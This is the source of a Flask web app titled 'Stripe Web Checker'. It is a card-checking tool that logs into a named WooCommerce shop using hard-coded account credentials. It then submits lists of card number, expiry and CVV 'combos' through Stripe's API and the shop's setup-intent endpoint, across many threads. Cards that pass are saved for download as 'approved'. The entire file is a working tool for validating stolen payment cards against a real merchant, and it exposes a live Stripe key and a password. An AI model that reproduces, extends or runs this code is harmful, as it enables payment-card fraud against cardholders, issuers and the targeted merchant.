from flask import Flask, request, render_template_string, send_file, redirect
import requests, random, re, threading, time, os
from bs4 import BeautifulSoup

app = Flask(__name__)

stripe_pk = 'pk_live_51J0pV2Ai5aSS7yFafQNdnFVlTHEw2v9DQyCKU4hs0u4R1R3MDes03yCFFeWlp0gEhVavJQQwUAJvQzSC3jSTye8Z00UACjDsfG'
login_url = 'https://blackdonkeybeer.com/my-account/'
check_url = 'https://blackdonkeybeer.com/my-account/add-payment-method/'
ajax_url = 'https://blackdonkeybeer.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent'
email = 'jigganigs22@gmail.com'
password = 'M3hg123!A'
origin = 'https://blackdonkeybeer.com'

headers = {
    'User-Agent': 'Mozilla/5.0',
    'Accept': '*/*',
    'Connection': 'keep-alive',
}

results_output = []
lock = threading.Lock()

def parse_combo_line(line):
    patterns = [
        r'(\d{13,16})\|(\d{2})/(\d{2,4})\|(\d{3,4})',
        r'(\d{13,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    ]
    for pattern in patterns:
        match = re.match(pattern, line)
        if match:
            return match.group(1), match.group(2), match.group(3), match.group(4), line
    return None

def fresh_login_session():
    session = requests.Session()
    resp = session.get(login_url, headers=headers)
    soup = BeautifulSoup(resp.text, 'html.parser')
    nonce = soup.find('input', {'name': 'woocommerce-login-nonce'})
    referer = soup.find('input', {'name': '_wp_http_referer'})
    if not nonce or not referer:
        raise Exception("Login page failed or nonce missing.")
    login_payload = {
        'username': email,
        'password': password,
        'woocommerce-login-nonce': nonce['value'],
        '_wp_http_referer': referer['value'],
        'login': 'Log in'
    }
    login_resp = session.post(login_url, data=login_payload, headers=headers)
    if 'customer-logout' not in login_resp.text:
        raise Exception("Login failed.")
    return session

def get_ajax_nonce(session):
    resp = session.get(check_url, headers=headers)
    soup = BeautifulSoup(resp.text, 'html.parser')
    script = soup.find('script', {'id': 'wc-stripe-upe-classic-js-extra'})
    if script and script.string:
        match = re.search(r'"createAndConfirmSetupIntentNonce"\s*:\s*"([a-zA-Z0-9]+)"', script.string)
        if match:
            return match.group(1)
    raise Exception("Could not find createAndConfirmSetupIntentNonce.")

def process_combo(combo):
    try:
        session = fresh_login_session()
        ajax_nonce = get_ajax_nonce(session)
    except Exception as e:
        with lock:
            results_output.append(f"Login failed: {str(e)}")
        return
    parsed = parse_combo_line(combo)
    if not parsed:
        with lock:
            results_output.append(f"Invalid combo format: {combo}")
        return
    card_number, exp_month, exp_year, cvv, full_combo = parsed
    try:
        stripe_data = {
            'type': 'card',
            'card[number]': card_number,
            'card[exp_month]': exp_month,
            'card[exp_year]': exp_year,
            'card[cvc]': cvv,
            'billing_details[address][postal_code]': str(random.randint(10000, 99999)),
            'key': stripe_pk,
        }
        stripe_resp = session.post('https://api.stripe.com/v1/payment_methods', headers={
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': headers['User-Agent'],
        }, data=stripe_data)
        stripe_json = stripe_resp.json()
        if 'error' in stripe_json:
            with lock:
                results_output.append(f"[{full_combo}] - Stripe Error: {stripe_json['error']['message']}")
            return
        payment_method_id = stripe_json['id']
        wc_payload = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }
        wc_resp = session.post(ajax_url, data=wc_payload, headers={
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': '*/*',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': check_url,
            'Origin': origin,
            'User-Agent': headers['User-Agent'],
        })
        json_resp = wc_resp.json()
        status = json_resp.get('data', {}).get('status')
        with lock:
            if status == 'succeeded':
                results_output.append(f"[{full_combo}] - Approved")
                with open('approved.txt', 'a') as f:
                    f.write(full_combo + '\n')
            elif status == 'requires_action':
                results_output.append(f"[{full_combo}] - Declined (3DS Secure)")
            else:
                results_output.append(f"[{full_combo}] - Declined")
    except Exception as e:
        with lock:
            results_output.append(f"[{full_combo}] - Error: {str(e)}")

def run_checker(combos, threads_count):
    results_output.clear()
    if os.path.exists("approved.txt"):
        os.remove("approved.txt")
    threads = []
    for combo in combos:
        while threading.active_count() > threads_count:
            time.sleep(0.01)
        t = threading.Thread(target=process_combo, args=(combo,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        combo_input = request.form.get('combos')
        threads_count = int(request.form.get('threads', 1))
        combo_list = [line.strip() for line in combo_input.strip().splitlines() if line.strip()]
        run_checker(combo_list, threads_count)
        return redirect('/results')
    return render_template_string('''
    <h2>Stripe Web Checker</h2>
    <form method="POST">
      <textarea name="combos" rows="12" cols="70" placeholder="Enter combos here..."></textarea><br><br>
      Threads: <input type="number" name="threads" value="5" min="1" max="30"><br><br>
      <button type="submit">Start Check</button>
    </form>
    ''')

@app.route('/results')
def results():
    results_html = '<br>'.join(results_output)
    return render_template_string(f'''
    <h2>Results</h2>
    <pre>{results_html}</pre>
    <br><a href="/download">Download Approved Combos</a><br>
    <a href="/">Back</a>
    ''')

@app.route('/download')
def download():
    return send_file('approved.txt', as_attachment=True)

if __name__ == '__main__':
    # LOCAL ONLY
    app.run(host="127.0.0.1", port=5000, debug=True)
